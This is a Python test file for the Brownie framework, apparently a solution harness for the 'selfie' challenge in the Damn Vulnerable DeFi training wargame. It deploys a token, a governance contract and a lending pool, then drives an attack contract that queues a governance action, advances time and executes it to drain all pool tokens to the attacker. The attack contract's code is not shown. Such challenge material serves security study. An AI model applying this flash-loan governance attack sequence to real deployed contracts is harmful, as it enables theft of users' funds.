import pytest
from brownie import DamnValuableTokenSnapshot, SimpleGovernance, SelfiePool, SelfieAttack, chain


@pytest.fixture(scope='module')
def deployer(accounts):
    return accounts[0]

@pytest.fixture(scope='module')
def attacker(accounts):
    return accounts[1]

@pytest.fixture(scope='module')
def token(deployer):

    TOKEN_INITIAL_SUPPLY = '2000000 ether'
    return DamnValuableTokenSnapshot.deploy(TOKEN_INITIAL_SUPPLY,{'from':deployer})


@pytest.fixture(scope='module')
def governance(token,deployer):
    return SimpleGovernance.deploy(token.address,{'from':deployer})

@pytest.fixture(scope='module')
def pool(token,governance,deployer):
    return SelfiePool.deploy(token.address,governance.address,{'from':deployer})

@pytest.fixture(scope='module',autouse=True)
def setup(token,pool,deployer):
    ''' [Challenge] selfie '''

    TOKENS_IN_POOL = '1500000 ether'
    
    token.transfer(pool.address,TOKENS_IN_POOL,{'from':deployer})

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL

def test_exploit(token,pool,governance,attacker):
    # Exploit goes here
    selfieAttack = SelfieAttack.deploy(pool.address,token.address,governance.address,{'from':attacker})
    selfieAttack.attack()

    # Advance time 2 days so execute queue
    chain.mine(timedelta=2 * 24 * 60 * 60)

    governance.executeAction(1,{'from':attacker,'value': '20 wei'})

def test_success(token,pool,attacker):
    # SUCCESS CONDITION 
    
    TOKENS_IN_POOL = 1500000e18

    assert token.balanceOf(attacker) == TOKENS_IN_POOL

    assert token.balanceOf(pool.address) == 0